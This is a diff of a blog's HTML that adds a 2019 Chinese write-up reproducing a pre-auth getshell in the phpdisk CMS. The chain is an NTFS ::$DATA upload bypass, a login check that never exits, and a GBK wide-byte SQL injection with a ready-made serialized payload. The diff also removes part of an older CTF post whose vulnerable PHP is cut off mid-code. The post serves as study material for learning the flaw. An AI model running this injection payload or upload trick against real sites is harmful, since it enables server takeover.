@@ -279,6 +279,191 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/11/xxxdisk前台Getshell-复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cookie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The clown is laughing at you">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/11/xxxdisk前台Getshell-复现/" class="post-title-link" itemprop="url">xxxdisk前台Getshell[复现]</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-07-11 17:47:53" itemprop="dateCreated datePublished" datetime="2019-07-11T17:47:53+08:00">2019-07-11</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Bearbeitet am</span>
+                
+                <time title="Geändert am: 2019-07-12 20:33:37" itemprop="dateModified" datetime="2019-07-12T20:33:37+08:00">2019-07-12</time>
+              </span>
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>跟着同学复现了一波,前台Getshell<br>参考链接:<br><a href="https://od0d.cn/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">phpdisk前台Getshell(复现)</a><br><a href="https://xz.aliyun.com/t/5594#toc-1" target="_blank" rel="noopener">代码审计 xxxdisk前台Getshell</a></p>
+<h1 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h1><p>选择的cms是phpdisk，在Windows平台的GBK版本上，挖掘到了一个无需登录的前台Getshell。</p>
+<p>同学告诉我，在审计初，最好要看看该cms的路由和全局变量过滤情况<br>然后查看之后确实是存在文件dosafe.php，将所有sql注入的参数过滤了个遍。</p>
+<h1 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h1><p>(1)从mydisk.php为权限判断未exit导致可以越权访问mydisk.php</p>
+<p>(2)利用windows下的NTFS ADS流trick绕过文件名后缀限制</p>
+<p>(3)通过phpdisk的版本iconv编码转化使用不当造成宽字节注入找到后台(已知漏洞)</p>
+<h1 id="0x03-文件上传漏洞"><a href="#0x03-文件上传漏洞" class="headerlink" title="0x03 文件上传漏洞"></a>0x03 文件上传漏洞</h1><p>用户注册后尝试上传一个php文件，到服务器中查看该文件，会发现该文件被转成txt类型的文件<br><img src="/2019/07/11/xxxdisk前台Getshell-复现/1.png" alt=""></p>
+<p>然后看看怎么绕过这个后缀限制,文件上传操作封装在函数<strong>upload_file()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpdisk/includes/function/global.func.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">($source, $target)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (function_exists(<span class="string">'move_uploaded_file'</span>) &amp;&amp; @move_uploaded_file($source, $target)) &#123;</span><br><span class="line">		@chmod($target, <span class="number">0666</span>);</span><br><span class="line">		<span class="keyword">return</span> $target;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (@copy($source, $target)) &#123;</span><br><span class="line">		@chmod($target, <span class="number">0666</span>);</span><br><span class="line">		<span class="keyword">return</span> $target;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (@is_readable($source)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($fp = @fopen($source,<span class="string">'rb'</span>)) &#123;</span><br><span class="line">			@flock($fp,<span class="number">2</span>);</span><br><span class="line">			$filedata = @fread($fp,@filesize($source));</span><br><span class="line">			@fclose($fp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($fp = @fopen($target, <span class="string">'wb'</span>)) &#123;</span><br><span class="line">			@flock($fp, <span class="number">2</span>);</span><br><span class="line">			@fwrite($fp, $filedata);</span><br><span class="line">			@fclose($fp);</span><br><span class="line">			@chmod ($target, <span class="number">0666</span>);</span><br><span class="line">			<span class="keyword">return</span> $target;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>然後查看哪些地方調用了該函數，該函數調用有兩處，我們這次的漏洞在第一處，<br>位于<strong>phpdisk/modules/upload.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码第70行</span></span><br><span class="line">...</span><br><span class="line">$file_ext = get_real_ext($file_extension);</span><br><span class="line">$dest_file = $file_real_path.$file_store_path.$file_real_name_store.$file_ext;</span><br><span class="line"><span class="keyword">if</span>(upload_file($file[<span class="string">'tmp_name'</span>],$dest_file))&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>使用函数<strong>get_real_ext()</strong>来处理后缀<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpdisk/includes/function/global.func.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_real_ext</span><span class="params">($file_extension)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $settings;</span><br><span class="line">	$file_extension = trim($file_extension);</span><br><span class="line">	<span class="keyword">if</span>($file_extension)&#123;</span><br><span class="line">		$exts = explode(<span class="string">','</span>,$settings[<span class="string">'filter_extension'</span>]);</span><br><span class="line">		<span class="keyword">if</span>(in_array($file_extension,$exts))&#123;</span><br><span class="line">			$file_ext = <span class="string">'.'</span>.$file_extension.<span class="string">'.txt'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$file_ext = <span class="string">'.'</span>.$file_extension;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$file_ext = <span class="string">'.txt'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $file_ext;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>使用黑名单filter_extension对后缀名进行修改添加<code>.txt</code>防止像php这样的恶意文件。<br>filter_extension位于：<code>/admin/setting.inc.php/38行</code><br>此处绕过的方法，是<strong>我们控制文件名为：<code>test.php::$data</code></strong>，就可以绕过。</p>
+<p>原理：<br>php在window的时候如果文件名为：文件名+<strong>::$DATA</strong>，此时会把<strong>::$DATA</strong>之后的数据当成文件流处理,不会检测后缀名.且保持<strong>::$DATA</strong>之前的文件名。</p>
+<p>参考:<a href="https://xz.aliyun.com/t/2539#toc-0" target="_blank" rel="noopener">渗透测试的WINDOWS NTFS技巧集合</a></p>
+<h1 id="0x04-权限绕过"><a href="#0x04-权限绕过" class="headerlink" title="0x04 权限绕过"></a>0x04 权限绕过</h1><p>关键代码<code>mydisk.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">#	Project: PHPDISK File Storage Solution</span></span><br><span class="line"><span class="comment">#	This is NOT a freeware, use is subject to license terms.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	Site: http://www.phpdisk.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	$Id: mydisk.php 25 2014-01-10 03:13:43Z along $</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	Copyright (C) 2008-2014 PHPDisk Team. All Rights Reserved.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"includes/commons.inc.php"</span>;</span><br><span class="line"></span><br><span class="line">phpdisk_core::user_login();</span><br><span class="line"></span><br><span class="line">define(<span class="string">'IN_MYDISK'</span> ,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fix firefox</span></span><br><span class="line"><span class="keyword">if</span>($item ==<span class="string">'upload'</span>)&#123;</span><br><span class="line">	$uid = (int)gpc(<span class="string">'uid'</span>,<span class="string">'GP'</span>,<span class="number">0</span>);</span><br><span class="line">	$pd_is_activated = @$db-&gt;result_first(<span class="string">"select is_activated from &#123;$tpf&#125;users where userid='$uid'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure></p>
+<p>查看<code>phpdisk_core::user_login()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">user_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $pd_uid,$pd_pwd;</span><br><span class="line">		<span class="keyword">if</span>(!$pd_uid || !$pd_pwd)&#123;</span><br><span class="line">			header(<span class="string">"Location: "</span>.urr(<span class="string">"account"</span>,<span class="string">"action=login&amp;ref="</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>]));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>这里认证没有通过仅仅只是302，并没有退出程序，当时不理解302为什么可以？<br>同学告诉我，302的话，就算没有在没有注册的情况下，程序检测到后，不会强制退出程序，而是继续执行mydisk.php接下来的代码</p>
+<h1 id="0x05-未授权上传"><a href="#0x05-未授权上传" class="headerlink" title="0x05 未授权上传"></a>0x05 未授权上传</h1><p><img src="/2019/07/11/xxxdisk前台Getshell-复现/2.png" alt=""><br>上传成功</p>
+<h1 id="0x06-宽字节注入"><a href="#0x06-宽字节注入" class="headerlink" title="0x06 宽字节注入"></a>0x06 宽字节注入</h1><p>此程序分为两个版本utf-8与gbk版，所以难免会有一些编码转换的地方，所以也难免发生不小心没有注意的地方。<br>函数<strong>convert_str()</strong>提供编码转换的功能<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glbal.inc.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert_str</span><span class="params">($in,$out,$str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $db;</span><br><span class="line">	$str = $db-&gt;escape($str);</span><br><span class="line">	<span class="keyword">if</span>(function_exists(<span class="string">"iconv"</span>))&#123;</span><br><span class="line">		$str = iconv($in,$out,$str);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(function_exists(<span class="string">"mb_convert_encoding"</span>))&#123;</span><br><span class="line">		$str = mb_convert_encoding($str,$out,$in);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $db-&gt;escape($str);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>查看调用该函数的文件，此处利用ajax.php一次宽字节注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ajax.php</span></span><br><span class="line"><span class="keyword">switch</span>($action)&#123;</span><br><span class="line">	...</span><br><span class="line">    $data = trim(gpc(<span class="string">'data'</span>,<span class="string">'P'</span>,<span class="string">''</span>));	</span><br><span class="line">    <span class="keyword">if</span>(strpos($data,<span class="string">','</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">	   $file = unserialize(base64_decode($data));</span><br><span class="line">				<span class="comment">/*foreach($file as $k=&gt;$v)&#123;</span></span><br><span class="line"><span class="comment">				$file[$k] = $db-&gt;escape($file[$v]);</span></span><br><span class="line"><span class="comment">				&#125;*/</span></span><br><span class="line">				$file[file_id] = (int)$file[file_id];</span><br><span class="line">				$file[file_size] = (int)$file[file_size];</span><br><span class="line">				$file[file_description] = $db-&gt;escape(trim($file[file_description]));</span><br><span class="line">				$file[file_extension] = $db-&gt;escape(trim($file[file_extension]));</span><br><span class="line">				$file[file_name] = $db-&gt;escape(trim($file[file_name]));</span><br><span class="line">				$num = @$db-&gt;result_first(<span class="string">"select count(*) from &#123;$tpf&#125;files where yun_fid='&#123;$file[file_id]&#125;' and userid='$pd_uid'"</span>);</span><br><span class="line">				<span class="keyword">if</span>($num &amp;&amp; $file[file_id])&#123;</span><br><span class="line">					$tmp_ext = $file[file_extension] ? <span class="string">'.'</span>.$file[file_extension] : <span class="string">''</span>;</span><br><span class="line">					$msg = $file[file_name].$tmp_ext;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					$report_status =<span class="number">0</span>;</span><br><span class="line">					$report_arr = explode(<span class="string">','</span>,$settings[<span class="string">'report_word'</span>]);</span><br><span class="line">					<span class="keyword">if</span>(count($report_arr))&#123;</span><br><span class="line">						<span class="keyword">foreach</span>($report_arr <span class="keyword">as</span> $value)&#123;</span><br><span class="line">							<span class="keyword">if</span> (strpos($file[<span class="string">'file_name'</span>],$value) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">								$report_status = <span class="number">2</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$ins = <span class="keyword">array</span>(</span><br><span class="line">					<span class="string">'yun_fid'</span> =&gt; $file[file_id],</span><br><span class="line">					<span class="string">'file_name'</span> =&gt; $file[file_name],</span><br><span class="line">					<span class="string">'file_key'</span> =&gt; $file_key,</span><br><span class="line">					<span class="string">'file_extension'</span> =&gt; $file[file_extension],</span><br><span class="line">					<span class="string">'file_mime'</span> =&gt; <span class="string">'application/octet-stream'</span>,</span><br><span class="line">					<span class="string">'file_description'</span> =&gt; $file[file_description],</span><br><span class="line">					<span class="string">'file_size'</span> =&gt; $file[<span class="string">'file_size'</span>],</span><br><span class="line">					<span class="string">'file_time'</span> =&gt; $timestamp,</span><br><span class="line">					<span class="string">'is_checked'</span> =&gt; $is_checked,</span><br><span class="line">					<span class="string">'in_share'</span> =&gt; $in_share,</span><br><span class="line">					<span class="string">'report_status'</span> =&gt; $report_status,</span><br><span class="line">					<span class="string">'userid'</span> =&gt; $pd_uid,</span><br><span class="line">					<span class="string">'folder_id'</span> =&gt; $folder_id ? $folder_id : <span class="number">-1</span>,</span><br><span class="line">					<span class="string">'ip'</span> =&gt; $onlineip,</span><br><span class="line">					);</span><br><span class="line">					$sql = <span class="string">"insert into &#123;$tpf&#125;files set "</span>.$db-&gt;sql_array($ins).<span class="string">";"</span>;</span><br><span class="line">					$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br><span class="line">				&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></p>
+<p>关键代码在：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into &#123;$tpf&#125;files set "</span>.$db-&gt;sql_array($ins).<span class="string">";"</span>;</span><br><span class="line">$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br></pre></td></tr></table></figure></p>
+<p>跟进函数<strong>sql_array()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_array</span> <span class="params">($arr)</span></span>&#123;</span><br><span class="line">		$ins = <span class="keyword">array</span>();</span><br><span class="line">		reset($arr);</span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">list</span>($c, $v) = each($arr))&#123;</span><br><span class="line">			$ins[] = ($v === <span class="keyword">NULL</span> ? sprintf(<span class="string">'`%s`=NULL'</span>, $c) : sprintf(<span class="string">'`%s`=\'%s\''</span>, $c, $v));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> implode(<span class="string">', '</span>, $ins);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>并且<strong>$ins</strong>=&gt;<strong>$file = unserialize(base64_decode($data))</strong>=&gt;<strong>$data = trim(gpc(‘data’,’P’,’’))</strong><br>所以我们可以传入$data,来控制$ins的值<br>将我们的输入base64解码后，反序列化成数组对象，最后传入sql语句。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br></pre></td></tr></table></figure></p>
+<p>最后执行语句的时候存在一处编码转换，也是这里直接导致了注入。<br>汉字在utf下为三个字节，在gbk下为两个字节，故而当我们传入的单引号被转义后<strong>\’</strong>，该单引号将会连同前三个字节在GBK下，被解释为两个字符，使得单引号逃逸。</p>
+<h1 id="0x07-漏洞复现"><a href="#0x07-漏洞复现" class="headerlink" title="0x07  漏洞复现"></a>0x07  漏洞复现</h1><p>(1)无权限下上传shell(刚才已上传过shell.php)<br>(2)上传成功后通过sql注入获取shell文件的位置。<br>需要获取文件位置，那么我们需要一个可以回显文件位置的地方，这里存在回显的地方，我们在页面上看，也就标签处可以回显，也就是file_description，故而构造payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"file_id"</span>=&gt;<span class="string">"17007"</span>,<span class="string">"file_name"</span>=&gt;<span class="string">"od錦',`in_share`=1,`file_description`=(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension=0x7068703a3a2464617461)x)#"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImZpbGVfaWQiO3M6NDoiMTAwMCI7czo5OiJmaWxlX25hbWUiO3M6MTYyOiK5/icsYGluX3NoYXJlYD0xLGBmaWxlX2Rlc2NyaXB0aW9uYD0oc2VsZWN0IHguYSBmcm9tIChzZWxlY3QgY29uY2F0KGZpbGVfc3RvcmVfcGF0aCxmaWxlX3JlYWxfbmFtZSlhIGZyb20gcGRfZmlsZXMgd2hlcmUgZmlsZV9leHRlbnNpb249MHg3MDY4NzAzYTNhMjQ2NDYxNzQ2MSl4KSMiO30=</span><br></pre></td></tr></table></figure></p>
+<p>不知道为什么这台电脑的数据库死活传不入数据库，但是复现的过程就是这样，可以参考参考链接的文章。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/08/依葫芦画瓢之escapeshellarg-与escapeshellcmd/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1864,186 +2049,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/25/JustSoso-web/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="cookie">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="The clown is laughing at you">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/25/JustSoso-web/" class="post-title-link" itemprop="url">JustSoso-web</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-
-          
-          
-          
-
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-04-25 19:36:30" itemprop="dateCreated datePublished" datetime="2019-04-25T19:36:30+08:00">2019-04-25</time>
-            </span>
-          
-
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2019-05-02 23:48:22" itemprop="dateModified" datetime="2019-05-02T23:48:22+08:00">2019-05-02</time>
-              </span>
-            
-          
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          <br>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>每一段代码都值得被温柔对待</p>
-<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>审计代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span 